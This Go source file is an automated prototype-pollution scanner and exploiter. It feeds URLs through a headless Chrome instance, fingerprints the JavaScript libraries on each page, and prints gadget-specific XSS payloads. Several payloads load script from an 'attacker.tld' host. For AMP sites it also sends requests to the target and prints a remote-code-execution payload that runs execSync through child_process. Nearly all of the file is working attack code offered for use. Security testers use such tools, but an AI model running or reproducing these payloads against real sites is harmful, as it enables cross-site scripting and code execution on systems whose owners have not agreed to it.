package main
import (
    "os"
    "bufio"
    "context"
    "math/rand"
    "log"
    "fmt"
    "github.com/chromedp/chromedp"
    "strings"
    "time"
    "net/http"
    "net/url"
)

//some fancy colour variables here
const (
        Info    = "[\033[33mINFO\033[0m]"
        Vulnerable = "[\033[32mVULN\033[0m]"
        Error   = "[\033[31mERRO\033[0m]"
        Exploit   = "[\033[34mEXPL\033[0m]"
)

//feel free to add more User-Agents
var useragents = []string{
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36",
    "Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; .NET CLR 1.1.4322)",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 5.1; rv:7.0.1) Gecko/20100101 Firefox/7.0.1",
    "Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:47.0) Gecko/20100101 Firefox/47.0",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.106 Safari/537.36 OPR/38.0.2220.41",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1",
}

var fingerprint string = `(() => {
  let gadgets = 'default';
  if (typeof _satellite !== 'undefined') {
    gadgets = 'Adobe Dynamic Tag Management ';
  } else if (typeof BOOMR !== 'undefined') {
    gadgets = 'Akamai Boomerang ';
  } else if (typeof goog !== 'undefined' && typeof goog.basePath !== 'undefined') {
    gadgets = 'Closure ';
  } else if (typeof DOMPurify !== 'undefined') {
    gadgets = 'DOMPurify ';
  } else if (typeof window.embedly !== 'undefined') {
    gadgets = 'Embedly Cards ';
  } else if (typeof filterXSS !== 'undefined') {
    gadgets = 'js-xss ';
  } else if (typeof ko !== 'undefined' && typeof ko.version !== 'undefined') {
    gadgets = 'Knockout.js ';
  } else if (typeof _ !== 'undefined' && typeof _.template !== 'undefined' && typeof _.VERSION !== 'undefined') {
    gadgets = 'Lodash <= 4.17.15 ';
  } else if (typeof Marionette !== 'undefined') {
    gadgets = 'Marionette.js / Backbone.js ';
  } else if (typeof recaptcha !== 'undefined') {
    gadgets = 'Google reCAPTCHA ';
  } else if (typeof sanitizeHtml !== 'undefined') {
    gadgets = 'sanitize-html ';
  } else if (typeof analytics !== 'undefined' && typeof analytics.SNIPPET_VERSION !== 'undefined') {
    gadgets = 'Segment Analytics.js ';
  } else if (typeof Sprint !== 'undefined') {
    gadgets = 'Sprint.js ';
  } else if (typeof SwiftypeObject != 'undefined') {
    gadgets = 'Swiftype Site Search ';
  } else if (typeof utag !== 'undefined' && typeof utag.id !== 'undefined') {
    gadgets = 'Tealium Universal Tag ';
  } else if (typeof twq !== 'undefined' && typeof twq.version !== 'undefined') {
    gadgets = 'Twitter Universal Website Tag ';
  } else if (typeof wistiaEmbeds !== 'undefined') {
    gadgets = 'Wistia Embedded Video ';
  } else if (typeof $ !== 'undefined' && typeof $.zepto !== 'undefined') {
    gadgets = 'Zepto.js ';
  } else if (typeof Vue != 'undefined') {
    gadgets = "Vue.js";
  } else if (typeof Popper !== 'undefined') {
    gadgets = "Popper.js";
  } else if (typeof pendo !== 'undefined') {
    gadgets = "Pendo Agent";
  } else if (typeof i18next !== 'undefined') {
    gadgets = "i18next";
  } else if (typeof Demandbase != 'undefined') {
    gadgets = "Demandbase Tag";
  } else if (typeof _analytics !== 'undefined' && typeof analyticsGtagManager !== 'undefined') {
    gadgets = "Google Tag Manager plugin for analytics";
  } else if (typeof can != 'undefined' && typeof can.deparam != 'undefined') {
    gadgets = "CanJS deparam";
  } else if (typeof $ !== 'undefined' && typeof $.parseParams !== 'undefined') {
    gadgets = "jQuery parseParams";
  } else if (typeof String.parseQueryString != 'undefined') {
    gadgets = "MooTools More";
  } else if (typeof mutiny != 'undefined') {
    gadgets = "Mutiny";
  } else if (document.getElementsByTagName('html')[0].hasAttribute('amp')) {
    gadgets = "AMP";
  } else if (typeof $ !== 'undefined' && typeof $.fn !== 'undefined' && typeof $.fn.jquery !== 'undefined') {
    gadgets = 'jQuery';
  }

 return gadgets;
})();
`            
func main() {
    
    fmt.Printf(`                                                                                 
    dMMMMb  dMMMMb  dMMMMMMMMb  .aMMMb  dMMMMb     v1.2.0
   dMP.dMP dMP.dMP dMP"dMP"dMP dMP"dMP dMP.dMP 
  dMMMMP" dMMMMP" dMP dMP dMP dMMMMMP dMMMMP"  
 dMP     dMP     dMP dMP dMP dMP dMP dMP           
dMP     dMP     dMP dMP dMP dMP dMP dMP            @kleiton0x7e

                                     
`)
    
    time.Sleep(2 * time.Second)
    
    rand.Seed(time.Now().Unix())
        
    sc := bufio.NewScanner(os.Stdin)
    for sc.Scan() {
	u := sc.Text()
        
        res := strings.Contains(u, "?")
        
        if res == true {
            queryEnum(u, `&`)   
        } else {
            queryEnum(u, `?`)
            queryEnum(u, `#`)
        }
    }
}
   
func queryEnum(u string, quote string) {
    
    payloads := [4]string{
        "constructor%5Bprototype%5D%5Bppmap%5D=reserved",
        "__proto__.ppmap=reserved",
        "constructor.prototype.ppmap=reserved",
        "__proto__%5Bppmap%5D=reserved",
    }
        
    for index, payload := range payloads {
        //a random useragent
        n := rand.Int() % len(useragents)
        _ = index
        full_url := string(u) + string(quote) + string(payload)

    opts := append(chromedp.DefaultExecAllocatorOptions[:],
	//uncomment the following lines to setup a proxy
	//chromedp.ProxyServer("localhost:8080"),
	//chromedp.Flag("ignore-certificate-errors", true),
	chromedp.UserAgent(useragents[n]),
    )
    ctx, cancel := chromedp.NewExecAllocator(context.Background(), opts...)
    defer cancel()
    ctx, cancel = chromedp.NewContext(
	ctx,
	//uncomment the next line to see the CDP messages
	//chromedp.WithDebugf(log.Printf),
    )
    defer cancel()

        // run task list
        var res string
        err := chromedp.Run(ctx,
            chromedp.Navigate(full_url),
            chromedp.Evaluate(`window.ppmap`, &res),
        )
        if err != nil {
            log.Printf(Error + " %s", full_url)
            continue
        }

        log.Printf(Vulnerable + " %s", full_url)
        time.Sleep(1 * time.Second)
        //now its fingerprinting time
        log.Printf(Info + " Fingerprinting the gadget...")
        var res1 string
        err1 := chromedp.Run(ctx,
            chromedp.Navigate(u),
            //change the value 5 to a higher one if your internet connection is slow
            chromedp.Sleep(5*time.Second),
            chromedp.Evaluate(fingerprint, &res1),
        )
        if err1 != nil {
            log.Fatal(err1)
        }
            
        log.Printf(Info + " Gadget found: " + string(res1))
        time.Sleep(2 * time.Second)
    
        if strings.Contains(string(res1), "default") {
           log.Printf(Error + " No gadget found") 
           log.Printf(Info + " Website is vulnerable to Prototype Pollution, but not automatically exploitable")
        } else if strings.Contains(string(res1), "Adobe Dynamic Tag Management") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[src]=data:,alert(1)//")
        } else if strings.Contains(string(res1), "Akamai Boomerang") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[BOOMR]=1&__proto__[url]=//attacker.tld/js.js")
        } else if strings.Contains(string(res1), "Closure") {
           log.Printf(Info + " Displaying all possible payloads")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[*%%20ONERROR]=1&__proto__[*%%20SRC]=1") 
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[CLOSURE_BASE_PATH]=data:,alert(1)//")
        } else if strings.Contains(string(res1), "DOMPurify") {
           log.Printf(Info + " Displaying all possible payloads")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[ALLOWED_ATTR][0]=onerror&__proto__[ALLOWED_ATTR][1]=src") 
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[documentMode]=9")
        } else if strings.Contains(string(res1), "Embedly") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[onload]=alert(1)") 
        } else if strings.Contains(string(res1), "jQuery") {
           log.Printf(Info + " Displaying all possible payloads")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[context]=<img/src/onerror%%3dalert(1)>&__proto__[jquery]=x")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[url][]=data:,alert(1)//&__proto__[dataType]=script")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[url]=data:,alert(1)//&__proto__[dataType]=script&__proto__[crossDomain]=")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[src][]=data:,alert(1)//")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[url]=data:,alert(1)//")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[div][0]=1&__proto__[div][1]=<img/src/onerror%%3dalert(1)>&__proto__[div][2]=1")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[preventDefault]=x&__proto__[handleObj]=x&__proto__[delegateTarget]=<img/src/onerror%%3dalert(1)>")
        } else if strings.Contains(string(res1), "js-xss") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[whiteList][img][0]=onerror&__proto__[whiteList][img][1]=src") 
        } else if strings.Contains(string(res1), "Knockout.js") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[4]=a':1,[alert(1)]:1,'b&__proto__[5]=,")
        } else if strings.Contains(string(res1), "Lodash <= 4.17.15") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[sourceURL]=%%E2%%80%A8%%E2%%80%%A9alert(1)") 
        } else if strings.Contains(string(res1), "Marionette.js / Backbone.js") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[tagName]=img&__proto__[src][]=x:&__proto__[onerror][]=alert(1)")
        } else if strings.Contains(string(res1), "Google reCAPTCHA") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[srcdoc][]=<script>alert(1)</script>") 
        } else if strings.Contains(string(res1), "sanitize-html") {
           log.Printf(Info + " Displaying all possible payloads")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[*][]=onload")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[innerText]=<script>alert(1)</script>")
        } else if strings.Contains(string(res1), "Segment Analytics.js") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[script][0]=1&__proto__[script][1]=<img/src/onerror%%3dalert(1)>&__proto__[script][2]=1")
        } else if strings.Contains(string(res1), "Sprint.js") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[div][intro]=<img%%20src%%20onerror%%3dalert(1)>")
        } else if strings.Contains(string(res1), "Swiftype Site Search") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[xxx]=alert(1)")
        } else if strings.Contains(string(res1), "Tealium Universal Tag") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[attrs][src]=1&__proto__[src]=//attacker.tld/js.js") 
        } else if strings.Contains(string(res1), "Twitter Universal Website Tag") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[attrs][src]=1&__proto__[hif][]=javascript:alert(1)") 
        } else if strings.Contains(string(res1), "Wistia Embedded Video") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[innerHTML]=<img/src/onerror=alert(1)>")
        } else if strings.Contains(string(res1), "Zepto.js") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[onerror]=alert(1)")
        } else if strings.Contains(string(res1), "Vue.js") {
           log.Printf(Info + " Displaying all possible payloads")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[v-if]=_c.constructor('alert(1)')()")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[attrs][0][name]=src&__proto__[attrs][0][value]=xxx&__proto__[xxx]=data:,alert(1)//&__proto__[is]=script")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[v-bind:class]=''.constructor.constructor('alert(1)')()")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[data]=a&__proto__[template][nodeType]=a&__proto__[template][innerHTML]=<script>alert(1)</script>")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + `__proto__[props][][value]=a&__proto__[name]=":''.constructor.constructor('alert(1)')(),"")`)
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[template]=<script>alert(1)</script>")
        } else if strings.Contains(string(res1), "Popper.js") {
           log.Printf(Info + " Displaying all possible payloads")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[arrow][style]=color:red;transition:all%%201s&__proto__[arrow][ontransitionend]=alert(1)")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[reference][style]=color:red;transition:all%%201s&__proto__[reference][ontransitionend]=alert(2)")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[popper][style]=color:red;transition:all%%201s&__proto__[popper][ontransitionend]=alert(3)")
        } else if strings.Contains(string(res1), "Pendo Agent") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[dataHost]=attacker.tld/js.js%%23")
        } else if strings.Contains(string(res1), "i18next") {
           log.Printf(Info + " Displaying all possible payloads")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[lng]=cimode&__proto__[appendNamespaceToCIMode]=x&__proto__[nsSeparator]=<img/src/onerror%%3dalert(1)>")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[lng]=a&__proto__[a]=b&__proto__[obj]=c&__proto__[k]=d&__proto__[d]=<img/src/onerror%%3dalert(1)>")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[lng]=a&__proto__[key]=<img/src/onerror%%3dalert(1)>")
        } else if strings.Contains(string(res1), "Demandbase Tag") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[Config][SiteOptimization][enabled]=1&__proto__[Config][SiteOptimization][recommendationApiURL]=//attacker.tld/json_cors.php?")
        } else if strings.Contains(string(res1), "Google Tag Manager plugin for analytics") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[customScriptSrc]=//attacker.tld/xss.js")  
        } else if strings.Contains(string(res1), "CanJS deparam") {
           log.Printf(Info + " Displaying all possible payloads")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[test]=test")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?constructor[prototype][test]=test")
        } else if strings.Contains(string(res1), "jQuery parseParams") {
           log.Printf(Info + " Displaying all possible payloads")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__.test=test")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?constructor.prototype.test=test")    
        } else if strings.Contains(string(res1), "MooTools More")   {    
           log.Printf(Info + " Displaying all possible payloads")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__[test]=test")
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "?constructor[prototype][test]=test")              
        } else if strings.Contains(string(res1), "Mutiny") {
           log.Printf(Exploit + " Final payload: " + string(u) + string(quote) + "__proto__.test=test")   
        } else if strings.Contains(string(res1), "AMP") {
           
           log.Printf(Exploit + " Final XSS payload: " + string(u) + string(quote) + "__proto__.ampUrlPrefix=https://pastebin.com/raw/E9f7BSwb")              
		   log.Printf(Info + " There might be an possible RCE exploit. Trying to leverage the impact...")
           time.Sleep(3 * time.Second)
           
           //parsing the url
		   link, err2 := url.Parse(u)
		   if err2 != nil {
		   	log.Fatal(err2)
		   }
           
           //sending the first request
           log.Printf(Info + " Sending a simple HTTP Request to target")
           resp0, err0 := http.Get(string(link.Scheme) + "://" + string(link.Hostname()) + "/")
           if err0 != nil{
             log.Fatalln(err0)
           }
           
           //check if first request was considered valid by the server
           if resp0.StatusCode >= 200 && resp0.StatusCode <= 399 {
             log.Printf(Info + " Payload 1 successfully sent")
             time.Sleep(1 * time.Second)
           } else {
             log.Printf(Error + " Something went wrong. Please try again!")
           }
           
           //sendint the second request with payload
           log.Printf(Info + " Sending request to enable AMP...")
           resp, err := http.Get(string(u) + string(quote) + "amp=1&__proto__.amp=hybrid")
           if err != nil {
             log.Fatalln(err)
           }
           time.Sleep(2 * time.Second)
              
           //check if the second request was considered valid by the server                   
           if resp.StatusCode >= 200 && resp.StatusCode <= 399 {
             log.Printf(Info + " Payload 2 successfully sent")
             time.Sleep(3 * time.Second)
             log.Printf(Exploit + " Final RCE payload (use Windows to popup Calculator): " + string(u) + string(quote) + "__proto__.validator=https://pastebin.com/raw/2H8MHf2G")
             log.Printf(Info + ` Payload used: (this.constructor.constructor("return process.mainModule.require('child_process')")()).execSync('calc')`)
           } else {
             log.Printf(Error + " Something went wrong. Please try again!")
           }
        
        } else {
           log.Printf(Error + " An unexcepted error occured")
        }
        
        break 
    }     
}
